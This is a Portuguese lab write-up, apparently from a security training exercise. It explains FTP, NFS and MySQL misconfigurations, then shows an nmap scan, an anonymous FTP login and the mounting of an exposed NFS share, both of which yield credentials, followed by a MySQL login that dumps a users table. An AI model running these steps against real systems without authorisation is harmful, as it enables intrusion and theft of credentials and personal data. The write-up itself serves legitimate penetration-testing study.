# _**Contexto de aplicações web**_
Muitos serviços diferentes podem funcionar na internet  
Esses serviços podem ter muitos casos de uso diferentes
Atacar serviços sempre começa com **enumeração**  
Precisamos entender quais serviços estão em execução e onde estão em execução para começar a atacá-los  
Faríamos enumeração usando nmap ou ferramentas de varredura semelhantes  
Um aspecto que facilita nosso trabalho é que os serviços são conhecidos por serem executados em portas específicas  
Cada serviço tem sua própria porta padrão, o que também facilita sua identificação  

Depois de identificar um serviço que está sendo executado em uma porta aberta, podemos pensar em possíveis vetores de ataque  
Abaixo está a maneira mais comum de atacar serviços conhecidos:
* **Explorando configurações incorretas comuns**
* **Usando exploits disponíveis publicamente**

Os serviços geralmente são configurados pela administração do computador e, na maioria das vezes, esses serviços têm configurações padrão fracas  
Outras vezes, usaríamos informações como números de versão e tipo de serviço para procurar exploits públicos  
É uma boa prática sempre começar explorando configurações incorretas  
Se houver exploits públicos para um serviço em execução, não é aconselhável realizar testes destrutivos  

*** 

**Contexto de FTP**  
**FTP é o protocolo de transferência de arquivos**  
O protocolo geralmente roda na porta 21 sobre o protocolo TCP  
FTP é um protocolo bastante antigo que é usado para transferir arquivos  
Um usuário tornaria um arquivo disponível carregando-o no servidor FTP, e outro usuário usaria um cliente FTP para se conectar ao servidor e baixar o arquivo  
Algumas configurações incorretas comuns para FTP incluem:
* **login anônimo**
* **Comunicação em texto simples**
* **Permissões ruins do sistema de arquivos**

Para se conectar a um servidor FTP, você pode usar o comando de linha de comando ftp: ```ftp [ip-address]```

***

**Contexto de NFS**  
NFS é um compartilhamento de arquivos de rede que roda em TCP e UDP nas portas 111 e 2049  
Assim como FTP, NFS é usado para transferir arquivos  
Eles ainda são bem diferentes  
Enquanto FTP usa um modelo _cliente-servidor_ para se comunicar, NFS atua como um _sistema distribuído_  
Isso significa que um usuário pode acessar um compartilhamento em seu próprio sistema de arquivos  
Enquanto o FTP usa nome de usuário e senha para gerenciar autenticação e autorização para arquivos, o NFS usa o sistema de permissão do Linux para gerenciar essas coisas  
Configurações incorretas comuns incluem:
* **Compartilhamentos acessíveis publicamente**
* **Quando as permissões de um arquivo são diferentes, um invasor teria que alterar seu ID de usuário/ID de grupo para corresponder às permissões do arquivo**

O primeiro passo seria enumerar um sistema para verificar se o NFS está em execução  
Uma vez que o NFS esteja em execução, verificaríamos se há compartilhamentos disponíveis  
Isso é feito usando este comando: ```showmount -e [ip_address]```  
Este comando mostra todos os compartilhamentos exportados pelo NFS  
Se este comando gerar algum compartilhamento, você pode tentar montá-lo no seu sistema de arquivos: ```mount ip:/file/path /local/file/path```  
Observe que este comando exigiria permissões **sudo**  

Depois que ele for montado com sucesso, você pode navegar até o local no seu sistema de arquivos e tentar acessar os arquivos  
Após concluir isso, você precisa desmontar o sistema de arquivos usando o comando: ```umount /local/file/path```  

***

**Contexto de MySQL**  
MySQL é um serviço que executa um servidor SQL  
Um servidor SQL é um tipo particular de servidor de banco de dados que usa linguagem de consulta estruturada (SQL) para adicionar e manipular dados  
O MySQL usa TCP e é executado na porta 3306 por padrão  
O SQL não tem nenhuma configuração incorreta comum que permita acesso direto, mas geralmente é usado como parte de uma cadeia de ataque  
Um invasor pode encontrar outras informações e usá-las para comprometer um servidor MySQL  
Se você encontrar um serviço MySQL em execução, tente se conectar ao serviço  
Se conseguir se conectar ao serviço, enumere o banco de dados das seguintes maneiras:
* **Examine bancos de dados**
* **Examine tabelas**
* **Procure informações confidenciais, como senhas e informações de identificação pessoal**

# _**Execução**_
> ```bash
> nmap -p 0-10000 -sV -A -T5 [ip_address]
> ```

<mark>Portas abertas</mark>  
* **21 | ftp (vsftpd 3.0.2) | anonymous login allowed**
* **22 | ssh (openssh 7.4)**
* **111 | rpcbind 2-4**
* **2049 | nfs_acl 3**
* **3306 | mysql 5.7.28**

<mark>Tentativa de login no serviço FTP</mark>
* ftp [ip_address]
* anonymous
* Login successful

<mark>Realizando o download do arquivo file.txt</mark>
* get file.txt
* cat file.txt
* remember to wipe mysql: root | ff912ABD*

<mark>Tentando se conectar em um servidor MySQL na porta 3306 com as credenciais acima</mark>
> ```bash
> mysql -h  [ip_address] -u root -p
> ```
_ERROR 2026 (HY000): TLS/SSL error: Certificate verification failure: The certificate is NOT trusted._

<mark>Tentando uma forma alternativa, verificação de mount na porta 2049</mark>
* showmount -e [ip_address]
* /opt/files *

<mark>Montando em meu diretório</mark>
* mount [ip_address]:/opt/files ../Downloads

<mark>Verificando os arquivos com ```ls```</mark>
* creds.txt

<mark>Verificando o conteúdo de creds.txt com ```cat```</mark>
* the password is securepassword123

<mark>Voltando a uma conexão mysql com esta nova senha</mark>  
_ERROR 1045 (28000): Access denied for user 'root'@'ip-10-9-0-126.eu-west-1.compute.internal' (using password: YES)_

<mark>Buscando informações na Internet, tenta-se novamente com o comando abaixo</mark>
* mysql -h  [ip_address] -u root -p
* ff912ABD*

<mark>Conexão feita. Agora, investigar o banco de dados</mark
* show * databases;
* show tables;
* select * from USERS;
* admin | bestpassword
